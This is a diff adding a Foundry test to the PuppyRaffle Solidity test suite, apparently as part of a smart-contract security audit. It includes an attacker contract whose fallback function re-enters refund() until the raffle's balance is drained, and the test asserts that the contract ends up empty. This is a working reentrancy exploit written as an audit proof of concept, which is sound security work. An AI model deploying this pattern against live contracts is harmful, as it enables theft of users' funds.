@@ -244,4 +244,36 @@ contract PuppyRaffleTest is Test {
 
         assertGt(secondJoinCost, firstJoinCost);
     }
+
+    function testAuditRefundReentrancy() public playersEntered {
+        AtackerContract atacker = new AtackerContract(puppyRaffle);
+        address[] memory players = new address[](1);
+        players[0] = address(atacker);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 index = puppyRaffle.getActivePlayerIndex(address(atacker));
+
+        uint256 initBalance = address(puppyRaffle).balance;
+        vm.prank(address(atacker));
+        puppyRaffle.refund(index);
+
+        uint256 endingBalance = address(puppyRaffle).balance;
+        assertGt(initBalance, entranceFee);
+        assertEq(endingBalance, 0);
+    }
+}
+
+contract AtackerContract {
+    PuppyRaffle puppyRaffle;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+    }
+
+    fallback() external payable {
+        uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
+        if (address(puppyRaffle).balance > 0) {
+            puppyRaffle.refund(index);
+        }
+    }
 }
